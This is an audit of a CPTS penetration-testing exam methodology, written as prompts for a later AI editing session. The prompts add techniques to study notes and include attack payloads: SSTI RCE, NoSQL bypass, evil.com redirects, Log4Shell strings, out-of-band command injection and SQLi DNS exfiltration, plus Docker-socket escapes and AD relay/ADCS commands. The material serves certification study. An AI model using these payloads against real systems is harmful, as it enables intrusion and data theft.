  CPTS Methodology Audit — Findings as AI Prompts                                                             
                                                                                                              
  STRUCTURAL ISSUES (section order broken)                                                                    
                                                                                                              
  Prompt #1 — Reorder sections to match phase flow                                                            
                                                                                                              
  The methodology file `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` has §13-24 placed AFTER     
  Appendices A-D, breaking the phase-flow reader. Reorganize so sections appear in actual exam phase order:   
                                                                                                              
  1. Move §19 (Pentest Process Stages) to the VERY TOP, right after §0 Pre-Engagement — this is the framework 
  reader needs first.                          
  2. Move §17 (Web OSINT/External Info Gathering) to BEFORE §1.1 (currently §1 starts with Nmap but OSINT must
   come first).                                                                                               
  3. Move §14 (Vulnerability Assessment Workflow) inline with §2 (currently §2 is 50 lines, §14 is 60 lines on
   same topic).                                                                                               
  4. Move §15 (Burp/ZAP Workflow) inline with §1.3 (web enum) — Burp setup is a §1.3 tool.
  5. Move §16 (Metasploit Framework Workflow) inline as §3.4 (tool used in exploitation).                     
  6. Move §13 (Common Application Attacks deep-dive) to §3.1.X subsections (currently duplicates §3.1 Step-7  
  CMS section).                                                                                               
  7. Move §18 (Documentation & Reporting Full) to merge with §10.                                             
  8. Move §20 (Bind vs Reverse Shell) into §9.7.                                                              
  9. Move §21 (Web Shell Library) into §9.6.                                                                  
  10. Move §22 (File Transfer Code Library) into §9.                                                          
  11. Move §23 (Quick AD attack ordering) into §6.2 as the cheat-sheet.                                       
  12. Move §24 (Service-Port Quick Reference) into Appendix area.                                             
  13. Renumber Appendices to come LAST (after all numbered sections).                                         
                                                                                                              
  Preserve all content. Update internal cross-references (§X.Y links) accordingly.                            
                                                                                                              
  Prompt #2 — Resolve duplicate-content sections                                                              
                                               
  The methodology has overlapping/duplicate sections that confuse the reader:                                 
                                                                                                              
  - §0.1 Pre-Engagement Checklist + §19.1 Pre-Engagement scoping items → merge into single §0.                
  - §9 File Transfers + §22 File Transfer Code Library → merge into single §9.                                
  - §3.1 Step-7 CMS Identification (lines 588-625) + §13 Common Application Attacks (lines 3617+) →           
  consolidate; current state shows Tomcat in BOTH with inconsistent default creds (line 618: `tomcat:tomcat`; 
  line 3681-3683: also `admin:admin`, `tomcat:s3cret`).
  - §10 Reporting Mindset + §18 Documentation & Reporting Full → merge.                                       
  - §11 When Stuck Checklist + §23 Quick AD attack ordering → cross-reference, AD-specific items in §11 step  
  14 duplicate §23.                                                                                           
  - Appendix A Default Creds and §13 per-app default creds → make Appendix A authoritative, remove duplicates 
  from §13.                                                                                                   
                                               
  Consolidate without losing any technique. After merge, ensure each command/technique appears exactly once   
  with cross-refs from secondary locations.
                                                                                                              
  ---      
  COVERAGE GAPS (missing techniques per HTB modules)
                                                                                                              
  Prompt #3 — Add missing web exploitation techniques
                                                                                                              
  The methodology `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` §3.1 Web Application Attacks is
  missing techniques covered in HTB Academy modules. Add as new subsections under §3.1 (or §13):              
   
  1. **SSTI (Server-Side Template Injection)** — entirely missing. Add:                                       
     - Detection payloads per engine: `{{7*7}}` (Jinja2/Twig), `${7*7}` (Freemarker/Velocity), `<%= 7*7 %>`
  (ERB), `#{7*7}` (Smarty), `*{7*7}` (Thymeleaf)                                                              
     - Engine fingerprinting decision tree
     - RCE payloads per engine (Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`)  
     - Tool: tplmap                                                                                           
                                                                                                              
  2. **PHP Type Juggling** — missing. Add:                                                                    
     - Magic hashes: `0e...` strings that hash to all-zero                                                    
     - Loose comparison bypasses (`==` vs `===`)                                                              
     - Common login form bypass payload `password[]=`
                                                                                                              
  3. **HTTP Verb Tampering** — gap GAP-R3-015 explicitly flagged this. Add:                                   
     - POST → GET/PUT/DELETE/PATCH/HEAD/OPTIONS/TRACE order                                                   
     - Apache .htaccess Limit directive bypass                                                                
                                                                                                              
  4. **CSRF (Cross-Site Request Forgery)** — only 1 mention (sqlmap flag). Add:                               
     - Detection (no anti-CSRF token, predictable token, token reuse)                                         
     - PoC HTML auto-submit form                                                                              
     - Bypass techniques: SameSite=None, missing Origin check, JSONP                                          
                                                                                                              
  5. **Open Redirect** — missing. Add:                                                                        
     - Test payloads: `?url=//evil.com`, `?next=https:evil.com`, `?return=///evil.com`                        
     - Chain to OAuth/SAML token theft                                                                        
                                                                                                              
  6. **NoSQL Injection** — missing. Add:                                                                      
     - MongoDB auth bypass: `{"username":{"$ne":null},"password":{"$ne":null}}`                               
     - JS injection: `; return true`                                                                          
     - Tools: NoSQLMap                                                                                        
                                                                                                              
  7. **JWT attacks expanded** — currently only `alg:none` mentioned. Add:                                     
     - alg:none full payload + jwt.io workflow                                                                
     - HMAC weak secret cracking (already mentioned mode 16500 — good)                                        
     - jku/kid header injection                                                                               
     - Tool: jwt_tool                                                                                         
                                                                                                              
  8. **GraphQL** — missing. Add:                                                                              
     - Introspection query: `{__schema{types{name fields{name}}}}`
     - Detection at `/graphql`, `/v1/graphql`, `/api/graphql`                                                 
     - Tools: InQL, graphql-cop
                                                                                                              
  9. **API testing depth** — currently §1.3 Step-6 is ~5 lines. Add:                                          
     - REST vs GraphQL vs gRPC detection                                                                      
     - Method override headers (X-HTTP-Method-Override)                                                       
     - Mass assignment (currently §13.13 is 4 lines — expand with examples)                                   
     - Rate limit bypass via header rotation                                                                  
                                                                                                              
  Each technique needs: Detection method, exploitation payload, tool option, and a `→ Next:` pointer.         
                                                                                                              
  Prompt #4 — Expand ADCS coverage (ESC2-7, 9-11)                                                             
                                               
  The methodology §6.3 covers only ADCS ESC1 and ESC8. The Active Directory Enumeration & Attacks HTB module  
  covers ESC1-ESC11. Add the missing ESCs:                                                                    
                                               
  - **ESC2** — Any Purpose EKU template (cert can be used for any auth). Same exploit as ESC1 essentially.    
  - **ESC3** — Certificate Request Agent EKU (request cert on behalf of another user).
  - **ESC4** — Vulnerable cert template ACL (write access lets you reconfigure template into ESC1).           
  - **ESC5** — Vulnerable PKI object access (write to CA / CA computer).                                      
  - **ESC6** — EDITF_ATTRIBUTESUBJECTALTNAME2 flag enabled on CA (any template becomes ESC1).                 
  - **ESC7** — Vulnerable CA ACL (Manage CA / Manage Certificates rights → grant ESC1).                       
  - **ESC9** — No security extension on cert (UPN spoofing).                                                  
  - **ESC10** — Weak cert mappings (StrongCertificateBindingEnforcement disabled).                            
  - **ESC11** — IF_ENFORCEENCRYPTICERTREQUEST disabled (NTLM relay to ICPR).                                  
                                                                                                              
  For each: prereqs, certipy command (`certipy req -template <vuln> ...`), and the auth follow-up (`certipy   
  auth -pfx`).                                                                                                
                                                                                                              
  Also add comprehensive `certipy find` interpretation: how to read `[!] Vulnerabilities` block.              
                                               
  Prompt #5 — Add coercion methods as a standalone subsection                                                 
           
  In `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` §6.3, add a dedicated `#### Coercion Methods  
  (Authentication Triggers)` subsection. Currently PetitPotam and PrinterBug appear scattered. Consolidate    
  plus add missing:                            
                                                                                                              
  | Method | RPC Interface | Prereq | Tool |                                                                  
  | MS-RPRN PrinterBug | `\\PIPE\\spoolss` | Spooler running, any domain user | printerbug.py |
  | MS-EFSRPC PetitPotam | `\\PIPE\\efsrpc` (newer: `\\PIPE\\lsarpc`) | Patched: needs creds | PetitPotam.py |
  | MS-DFSNM DFSCoerce | `\\PIPE\\netdfs` | DFS Namespace service running | dfscoerce.py |                    
  | MS-FSRVP ShadowCoerce | `\\PIPE\\FssagentRpc` | File Server VSS Agent installed | shadowcoerce.py |       
  | MS-EVEN Coerce | EventLog | Less common | coercer.py (covers all) |                                       
                                                                                                              
  One-shot tool: `coercer scan -u '<u>' -p '<p>' -t <target> -l <listener>` then `coercer coerce`.            
                                                                                                              
  Show how each chains into ntlmrelayx for SMB→LDAP, SMB→ADCS (ESC8), and SMB→SMB.                            
                                               
  Prompt #6 — Add SCCM, ADIDNS, KrbRelayUp attacks                                                            
           
  The Attacking Enterprise Networks HTB module covers attacks missing from
  `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md`:                                                 
   
  1. **SCCM (System Center Configuration Manager)**:                                                          
     - Discovery: `nxc smb <cidr> -M sccm` / `SharpSCCM find`
     - NAA (Network Access Account) credential extraction (often DA-equivalent stored on every client)        
     - SCCM relay attacks (HTTP → MSSQL site server)                                                          
     - Tools: SharpSCCM, sccmwtf, MalSCCM                                                                     
                                                                                                              
  2. **ADIDNS (AD-Integrated DNS) record manipulation**:                                                      
     - Add a wildcard / WPAD record as any authenticated user                                                 
     - `Invoke-DNSUpdate` (Powermad)                                                                          
     - Combined with mitm6 / Responder for relay                                                              
                                                                                                              
  3. **KrbRelayUp** — local UAC bypass on a domain-joined workstation via Kerberos relay (RBCD self-attack)   
                                                                                                              
  4. **Resource-Based Constrained Delegation (RBCD) self-attack** — currently mentioned briefly. Expand the   
  full attack path: GenericAll on a computer → write msDS-AllowedToActOnBehalfOfOtherIdentity →
  S4U2Self+S4U2Proxy → admin shell.                                                                           
           
  5. **WSUS abuse** — if you control updates pushed to a host, you push your malicious update.                
   
  Place these in §6.3 under a new `#### Enterprise/Modern AD Attacks` subsection.                             
           
  Prompt #7 — Add missing common applications to §13                                                          
           
  §13 Common Application Attacks in `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` covers         
  WordPress through ColdFusion but is missing several apps frequently seen in CPTS exam scenarios. Add:       
                                               
  - **Confluence** (CVE-2022-26134 OGNL injection unauth RCE; CVE-2023-22515 broken access control)           
  - **Jira** (CVE-2022-0540 unauth RCE; CVE-2019-11581)
  - **Spring Boot Actuator + Spring4Shell** (CVE-2022-22965 — `/env`, `/heapdump`, `/jolokia`)                
  - **Log4Shell (CVE-2021-44228)** — every Java app is a candidate; payload `${jndi:ldap://<lh>/x}` in        
  User-Agent/X-Forwarded-For/etc.                                                                             
  - **ManageEngine** (multiple CVEs — ServiceDesk, ADManager Plus, OpManager)                                 
  - **VMware ESXi/vCenter** (CVE-2021-21972 unauth RCE)                                                       
  - **Atlassian Crowd** (CVE-2019-11580)                                                                      
  - **Apache Struts (S2-*)** — OGNL injection                                                                 
  - **Citrix ADC/Netscaler** (CVE-2019-19781, CVE-2023-3519)                                                  
  - **F5 BIG-IP** (CVE-2020-5902, CVE-2022-1388)                                                              
  - **Fortinet FortiOS / FortiGate** (CVE-2022-40684)                                                         
  - **PaperCut** (CVE-2023-27350)                                                                             
  - **SharePoint** (CVE-2019-0604, CVE-2023-29357)                                                            
                                                                                                              
  For each: detection (curl + version banner / endpoint), exploit one-liner, post-exploit shell upgrade.      
                                                                                                              
  Prompt #8 — Add Linux capabilities full table                                                               
                                               
  In `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` §4.2 "Capabilities" subsection currently lists
   only 3 capabilities (cap_setuid, cap_dac_read_search, cap_chown). Expand to a comprehensive table:         
   
  | Capability | What it allows | Exploitation |                                                              
  | cap_setuid | Set arbitrary UID | `python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
  | cap_setgid | Set arbitrary GID | similar with setgid |                                                    
  | cap_dac_read_search | Read any file (bypass DAC) | `tar -cvf /tmp/s.tar /etc/shadow` |
  | cap_dac_override | Write any file | edit /etc/passwd or /etc/sudoers |                                    
  | cap_chown | Change file ownership | chown root:root /tmp/sh; chmod +s |                                   
  | cap_fowner | Bypass file owner perm checks | chmod g+w /etc/shadow |                                      
  | cap_sys_admin | Effectively root | mount remount; insmod; etc. |                                          
  | cap_sys_module | Load kernel modules | insmod backdoor.ko |                                               
  | cap_sys_ptrace | Ptrace any process | inject into init, dump root processes |                             
  | cap_net_admin | Configure interfaces | tcpdump; raw socket; create tun/tap |                              
  | cap_net_raw | Raw sockets | nmap raw scans, packet crafting |                                             
  | cap_net_bind_service | Bind low ports | bind a backdoor to <1024 |                                        
  | cap_kill | Kill any process | kill init? noisy |                                                          
  | cap_audit_write | Write audit log | log spoofing |                                                        
  | cap_sys_chroot | chroot escape baseline | chroot/pivot_root tricks |                                      
                                                                                                              
  Then a discovery one-liner: `getcap -r / 2>/dev/null` and a GTFOBins reminder.                              
                                                                                                              
  Prompt #9 — Add restricted shell escape detail                                                              
                                               
  In `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` §4.2 has a `#### Restricted shell (rbash,     
  rksh, lshell) escape` heading but the content is minimal. Expand to:                                        
                                               
  1. **Identify which restricted shell**: `echo $SHELL`, `cat /etc/shells`, `which rbash`                     
  2. **Common rbash escapes** (in priority order):
     - `BASH_CMDS[a]=/bin/sh; a` (rbash override)                                                             
     - `PATH=/bin:/usr/bin; export PATH; SHELL=/bin/sh; export SHELL`                                         
     - `ssh user@host -t "bash --noprofile"`                                                                  
     - `vi → :set shell=/bin/sh → :shell`                                                                     
     - `find / -name testtest -exec /bin/sh \;`                                                               
     - `awk 'BEGIN {system("/bin/sh")}'`                                                                      
  3. **lshell escapes**: `python -c 'import pty;pty.spawn("/bin/sh")'` after `lshell` aliasing fails          
  4. **rksh / ksh**: `ed; !sh`                                                                                
  5. **Container escape if shell is in a container**: Check `cat /proc/1/cgroup`, look for `/docker/`. Escape 
  via `/dev/sda*` access (privileged container), Docker socket mount (`docker -H unix:///var/run/docker.sock  
  run -v /:/host -it alpine chroot /host sh`), capability-based escape (cap_sys_admin).                       
                                                                                                              
  Prompt #10 — Add explicit Burp Collaborator / OOB section                                                   
                                               
  §15 Burp/ZAP Workflow in `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` doesn't cover Burp      
  Collaborator (Pro) usage. Add `### 15.8 Burp Collaborator / OAST for OOB testing` covering:                 
                                               
  - When to use OOB: blind SSRF, blind XXE, blind SQLi, blind cmd injection, DNS exfil                        
  - Free alternatives: interact.sh (`interactsh-client`), oast.pro, canarytokens
  - Payload patterns:                                                                                         
    - Blind XXE: `<!ENTITY x SYSTEM "http://<collab>">`
    - Blind cmd inj: `; nslookup <collab> ;` / `; curl <collab>/$(whoami) ;`                                  
    - SQLi DNS exfil (MSSQL): `EXEC master..xp_dirtree '\\<collab>\$(query)\share'`                           
    - SQLi DNS exfil (Oracle): `UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users)||'.<collab>')`       
  - Workflow: copy collab subdomain → inject into every blind injection candidate → poll for hits.            
                                                                                                              
  ---                                                                                                         
  CONTENT QUALITY ISSUES                                                                                      
                                                                                                              
  Prompt #11 — Replace Metasploit set RHOSTS with file syntax
                                                                                                              
  In `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` §16, the Metasploit examples use single-IP
  RHOSTS only. Add the file-input syntax that's mandatory for multi-host exam targets:                        
           
  msf6> set RHOSTS file:/path/to/targets.txt                                                                  
  msf6> set RHOSTS 10.10.10.0/24
  msf6> set RHOSTS 10.10.10.5,10.10.10.7,10.10.10.10                                                          
           
  Also add:                                                                                                   
  - `info` and `info -d` after `use <module>` (read full module description before running)
  - `setg` for global vars (LHOST, LPORT)                                                                     
  - `save` to persist                                                                                         
  - `loadpath /path/to/modules/` for custom modules                                                           
  - `route add 10.10.10.0/24 1` (manual route through session 1, alternative to `run autoroute`)              
                                                                                                              
  Prompt #12 — CVSS v3.1 vector string explanation                                                            
                                                                                                              
  §14.1 in `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` says "Use
  https://www.first.org/cvss/calculator/3.1 — never invent scores" and shows typical scores per finding type. 
  But it doesn't teach the reader how to BUILD a CVSS vector. Add:
                                                                                                              
  CVSS v3.1 Base Metrics breakdown:
  - AV (Attack Vector): N=Network, A=Adjacent, L=Local, P=Physical
  - AC (Attack Complexity): L=Low, H=High                                                                     
  - PR (Privileges Required): N=None, L=Low, H=High                                                           
  - UI (User Interaction): N=None, R=Required                                                                 
  - S (Scope): U=Unchanged, C=Changed                                                                         
  - C/I/A (Confidentiality/Integrity/Availability impact): N=None, L=Low, H=High                              
                                               
  Example breakdown for "Default Tomcat Creds → RCE":                                                         
  `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 Critical
                                                                                                              
  Also note CVSS v4.0 exists (released Nov 2023) — not yet required for CPTS but mention for completeness.    
                                                                                                              
  Prompt #13 — Add proxychains config example                                                                 
                                               
  `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` references proxychains throughout (§8) but never 
  shows the `/etc/proxychains4.conf` syntax that beginners need. Add to §8:                                   
                                               
  /etc/proxychains4.conf — minimal exam config                                                                
           
  strict_chain                                                                                                
  proxy_dns
  remote_dns_subnet 224                                                                                       
  tcp_read_time_out 15000                                                                                     
  tcp_connect_time_out 8000                                                                                   
                                                                                                              
  [ProxyList]                                                                                                 
  Default Chisel SOCKS5                        
                                                                                                              
  socks5 127.0.0.1 1080
                                                                                                              
  Multi-hop example (chain order matters with strict_chain)                                                   
                                                                                                              
  socks5 127.0.0.1 1080    # tunnel 1                                                                         
                                               
  socks5 127.0.0.1 1081    # tunnel 2 (deeper)                                                                
   
                                                                                                              
  Also note: `dynamic_chain` vs `strict_chain` vs `random_chain` — for multi-hop pivots, `strict_chain` is    
  correct (each proxy in declared order).      
                                                                                                              
  Prompt #14 — Make /etc/hosts addition a hard rule
                                                                                                              
  `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` §0.1 mentions adding hostnames to /etc/hosts but
  it's buried in a checklist. Promote this to a top-level rule with examples:                                 
   
  Create a new `### 0.3 The /etc/hosts Rule` section:                                                         
  - **EVERY discovered hostname → /etc/hosts immediately.** No exceptions. Many AD/Kerberos attacks fail
  silently if you hit by IP instead of FQDN.                                                                  
  - Sources to harvest hostnames from:
    - nmap `-sV` banner (NetBIOS, AD computer name)                                                           
    - SMB null session: `nxc smb <ip>` shows hostname/domain                                                  
    - LDAP: `ldapsearch -x -s base namingcontexts`                                                            
    - Kerberos error: `KDC_ERR_S_PRINCIPAL_UNKNOWN` includes the FQDN expected                                
    - SSL cert CN/SAN: `openssl s_client -connect <ip>:443 -showcerts`                                        
    - HTTP redirect Location header                                                                           
    - vhost discovery                                                                                         
  - One-liner to add: `echo "10.10.10.5  dc01.inlanefreight.local inlanefreight.local dc01" | sudo tee -a     
  /etc/hosts`                                                                                                 
  - For Kerberos: ensure all DC + computer accounts FQDNs resolve correctly.                                  
                                                                                                              
  Prompt #15 — Standardize section template    
                                                                                                              
  `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` subsections vary wildly in structure. Some have
  triggers, some don't; some have "next" pointers, most don't. Apply a consistent template to every           
  subsection:
                                                                                                              
  N.X Title                                                                                                   
                                               
  Trigger: [the condition that activates this section]                                                        
  You have: [what input/access you've already obtained]
  Goal: [what this section produces]                                                                          
                                                                                                              
  [Decision tree / IF-ELSE branches]                                                                          
                                                                                                              
  [Copy-paste commands]                                                                                       
                                               
  ▎ 🔄 LOOP: [if applicable — what triggers loop-back]                                                        
  ▎ ⚠️  Caveat: [common gotcha / failure mode]
                                                                                                              
  → Next: [where to go after this succeeds]                                                                   
  ← Fallback: [where to go if this fails]                                                                     
                                                                                                              
  Apply to every numbered subsection in §1-§9 and §13. This makes the document navigable mid-exam under
  stress.                                                                                                     
   
  Prompt #16 — Add a master "Final Pre-Submit Checklist" expansion                                            
           
  The "Final Pre-Submit Checklist" at the end of `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md`   
  has 10 items. Expand to be exhaustive — these are the items most CPTS candidates forget on report day:      
                                               
  ADD:                                                                                                        
  - [ ] Every credential in `creds/credentials.txt` has been sprayed against every host (run the matrix one
  final time)                                                                                                 
  - [ ] Every host has a `loot/<ip>-<host>/` folder with at minimum: nmap output, hostname/whoami output,
  flags                                                                                                       
  - [ ] Attack chain diagram has been re-drawn after every new host added
  - [ ] Every screenshot has the IP/hostname visible in the terminal prompt (no anonymous shells)             
  - [ ] Tmux logs grep-confirmed for every `> ` prompt (proves you ran what you say you ran)                  
  - [ ] Every finding in the report has CVSS vector string (not just score)                                   
  - [ ] CWE ID assigned to every finding (e.g., CWE-89 for SQLi)                                              
  - [ ] Remediation per finding is specific (not "use strong passwords" — give the actual config change)      
  - [ ] Executive summary has named the highest impact in plain English                                       
  - [ ] Cleanup section in report lists every artifact left behind (or confirms removal)                      
  - [ ] PDF export of report previewed before submission (no broken images, no Lorem Ipsum)                   
  - [ ] Submission timezone double-checked against deadline                                                   
  - [ ] Submitted ZIP/PDF opened from a fresh extract to confirm not corrupted                                
                                                                                                              
  Prompt #17 — Fix specific commands with errors                                                              
                                                                                                              
  In `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md`, audit and fix these specific command issues: 
                                                                                                              
  1. Line ~3015: `impacket-smbserver share /home/k/share -smb2support -smb2support` — duplicate `-smb2support`
   flag. Fix to single flag.                                                                                  
                                                                                                              
  2. Line ~2862-2863: in the `extra-sid` golden ticket forge, the line continues with `Administrator` on a new
   line (looks like missing `\` continuation or the user is positional). Add explicit comment that
  `Administrator` is the username argument.                                                                   
           
  3. Line ~2245-2246: AD enum kerbrute uses `-d` flag but kerbrute v1.0.3+ deprecated some flags. Verify      
  against current kerbrute syntax.
                                                                                                              
  4. Line ~309: `evil-winrm -i <ip> -u <user> -p '<pass>' -s /opt/ps-scripts/` — flag is `-s` for scripts     
  path; clarify (lowercase = scripts, uppercase = TLS).
                                                                                                              
  5. Line ~3205: `Invoke-RestMethod -Uri http://<attacker>:9999/upload -Method Post -InFile C:\Loot\f` — works
   only for newer PS; older Windows needs `Invoke-WebRequest`. Note version dependency.
                                                                                                              
  6. Line ~4035: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication                                      
  ";document.write();h=new%20ActiveXObject("WScript.Shell");h.run("calc");` — has unescaped quotes that will
  break in many shells. Provide a one-line cmd.exe-safe version.                                              
           
  7. Line ~2535: `python3 printerbug.py <dom>/<u>:'<p>'@<dc-ip> <attacker-ip>` — the printerbug.py from       
  krbrelayx repo uses different syntax than dirkjanm fork. Specify which repo and current syntax.
                                                                                                              
  8. AS-REP roasting at line 2367: `impacket-GetNPUsers <dom>/<user>:'<pass>' -request -dc-ip <dc-ip>` —      
  missing the `-format hashcat` flag (default is JtR format). Add it.
                                                                                                              
  9. Line ~2073: `kerbrute userenum --dc <dc-ip> -d <dom>                                                     
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid.txt` — kerbrute needs `--domain`
  not `-d` in current versions; verify syntax.                                                                
           
  10. Line ~2515: `certipy find -u <u>@<dom> -p '<p>' -dc-ip <dc-ip> -vulnerable -stdout` — current certipy   
  uses `-username` not `-u` (single-dash short flags removed). Update to v4+ syntax.
                                                                                                              
  ---      
  CRITICAL OMISSIONS                           
                    
  Prompt #18 — Add a "Phase Completion Gate" between sections
                                                                                                              
  `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` lacks explicit "exit gates" between phases —
  readers can skip recon and jump to exploitation. Add a `> ✅ **GATE**` block at the end of each major phase 
  that lists the artifacts you must have before proceeding:
                                                                                                              
  After §1 (Recon & Enum):                                                                                    
  > ✅ **GATE — Before §2/§3**: You must have: 
  > - [ ] Full TCP scan (-p-) output for every host                                                           
  > - [ ] UDP top-100 output for every host                                                                   
  > - [ ] -sV -sC service scan for every open port                                                            
  > - [ ] Banner/version recorded for every service                                                           
  > - [ ] All discovered hostnames in /etc/hosts                                                              
  > - [ ] Web tech fingerprint (whatweb) for every web port                                                   
  > - [ ] If AD: SMB null/guest enum done, LDAP anon bind tested                                              
                                                                                                              
  After §2 (Vuln ID):                                                                                         
  > ✅ **GATE — Before §3**: You must have:                                                                   
  > - [ ] searchsploit run for every version banner                                                           
  > - [ ] At least 2 candidate exploits per host (primary + fallback)                                         
  > - [ ] Web app: manual test order completed (auth → IDOR → SQLi → XSS → upload → cmdi → SSRF → LFI → XXE → 
  deserial → SSTI)                                                                                            
                                                                                                              
  After §3 (Exploitation, foothold obtained):                                                                 
  > ✅ **GATE — Before §4/§5**: You must have: 
  > - [ ] Stable shell (TTY upgraded if Linux, PS prompt if Windows)                                          
  > - [ ] Initial enum: `id`/`whoami /all`, `hostname`, `ip a`/`ipconfig`, `ps`/`tasklist`                    
  > - [ ] Network footprint: `ip r`/`route print`, `arp -a`                                                   
  > - [ ] Foothold credentials saved to creds/credentials.txt                                                 
                                                                                                              
  (Continue for §4, §5, §6, §7, §8.)                                                                          
                                                                                                              
  This forces methodology to gate-check before progression — most candidates fail because they skipped a step.
                                               
  Prompt #19 — Add SQLi POST + CSRF combo template                                                            
           
  GAP-R3-006 flagged "SQLMap command templates for 8 exam scenarios". §3.1 SQLi covers basics but doesn't have
   ready templates for these scenarios. Add a `#### SQLMap Scenario Templates` block to §3.1 with copy-paste  
  commands for:                                
                                                                                                              
  1. **GET parameter (basic)**:
     `sqlmap -u "http://h/p?id=1" --batch --dbs`
                                                                                                              
  2. **POST with Burp request file**:
     `sqlmap -r req.txt --batch --dbs`                                                                        
                                                                                                              
  3. **POST + CSRF token**:                    
     `sqlmap -r req.txt --csrf-token=csrf_token --csrf-url=http://h/login --batch --dbs`                      
                                                                                                              
  4. **Cookie-based**:                                                                                        
     `sqlmap -u "http://h/" --cookie="PHPSESSID=abc; admin=true" --level=2 --batch --dbs`                     
                                                                                                              
  5. **Header injection (User-Agent / Referer)**:                                                             
     `sqlmap -u "http://h/" --user-agent="*" --batch --dbs`                                                   
     `sqlmap -u "http://h/" --referer="*" --batch --dbs`                                                      
                                               
  6. **Time-based blind only (no other techniques)**:                                                         
     `sqlmap -u "http://h/?id=1" --technique=T --time-sec=5 --batch --dbs`
                                                                                                              
  7. **WAF bypass with tampers**:                                                                             
     `sqlmap -r req.txt --tamper=space2comment,between,charunicodeencode --random-agent --level=5 --risk=3    
  --batch`                                                                                                    
                                               
  8. **Authenticated multi-step (with auth URL)**:                                                            
     `sqlmap -u "http://h/profile?id=1" --auth-type=basic --auth-cred="user:pass" --batch`
     or                                                                                                       
     `sqlmap -u "http://h/profile?id=1" --cookie="$(curl -s -c - http://h/login -d 'u=x&p=y' | grep PHP | awk
  '{print $7"="$8}')" --batch`                                                                                
           
  Plus a `--os-shell` warning (loud, only on `--is-dba` confirmed).                                           
           
  Prompt #20 — Add explicit "No-Cred Starting Position" decision tree                                         
           
  `/home/hri7hik/CPTS_Notes/CPTS_Exam_Master_Methodology.md` assumes the reader knows what to do at start. Add
   an explicit `## 0.4 Day-1 Starting Decision` section right after §0:                                       
                                               
  You connected to the VPN. You have IPs/CIDR. Nothing else. Decide:                                          
           
  EXTERNAL ENGAGEMENT?                                                                                        
    → §17 (OSINT) FIRST — domains, subdomains, employees, leaks
    → Then §1 active recon                                                                                    
                                                                                                              
  INTERNAL ENGAGEMENT (jump-box VM)?                                                                          
    → §1.1 nmap full TCP across given CIDR (fast scan)                                                        
    → While scanning: §0.5 baseline tooling check + tmux setup                                                
    → As hosts come up: §1.2 service enum per-port                                                            
                                                                                                              
  WEB APP ONLY?                                                                                               
    → §17.4-17.8 OSINT + crawl                                                                                
    → §1.3 web enum                                                                                           
    → §3.1 + §13 attack tree                   
                                                                                                              
  RED-TEAM-STYLE (single foothold given)?                                                                     
    → §4 or §5 immediately on the foothold                                                                    
    → §1 from the foothold for internal pivot                                                                 
                                                                                                              
  WITH PROVIDED CREDS (low-priv domain user)?                                                                 
    → §6.1 AD enum                                                                                            
    → §23 quick AD attack ordering                                                                            
    → §6.2 decision tree                       
                                                                                                              
  Time budget for first 4 hours:
    Hour 1: Recon (nmap full TCP + UDP top-100 in background)                                                 
    Hour 2: Service-by-service enum + initial web crawl                                                       
    Hour 3: First exploitation attempts on highest-value targets                                              
    Hour 4: Foothold + post-ex initial enum                                                                   
                                                                                                              
  This eliminates the "where do I start?" paralysis on Day 1.                                                 
                                                                                                              
  ---                                          
  SUMMARY                                                                                                     
           
  Total findings: 20 prompts                   

  ┌────────────────────────────────────┬───────┬──────────────────────────────────────────────────┐           
  │              Category              │ Count │                     Severity                     │
  ├────────────────────────────────────┼───────┼──────────────────────────────────────────────────┤           
  │ Structural / ordering              │ 2     │ HIGH (impacts navigation under exam stress)      │
  ├────────────────────────────────────┼───────┼──────────────────────────────────────────────────┤
  │ Coverage gaps (missing techniques) │ 8     │ HIGH-MEDIUM (could cost finding points)          │           
  ├────────────────────────────────────┼───────┼──────────────────────────────────────────────────┤           
  │ Content quality                    │ 7     │ MEDIUM (cleanup, consistency)                    │           
  ├────────────────────────────────────┼───────┼──────────────────────────────────────────────────┤           
  │ Critical omissions                 │ 3     │ HIGH (gates, scenario templates, day-1 decision) │
  └────────────────────────────────────┴───────┴──────────────────────────────────────────────────┘           
   
  Top 3 to fix first:                                                                                         
  1. Prompt #1 (reorder §13-24 inline with phases)
  2. Prompt #20 (Day-1 starting decision tree)                                                                
  3. Prompt #4 (ADCS ESC2-11 — frequently in exam)
                                                                                                              
  Hand any of these prompts to the next AI session for surgical edits. Each is self-contained — model needs   
  only the file path + the prompt.                                                                            
                                     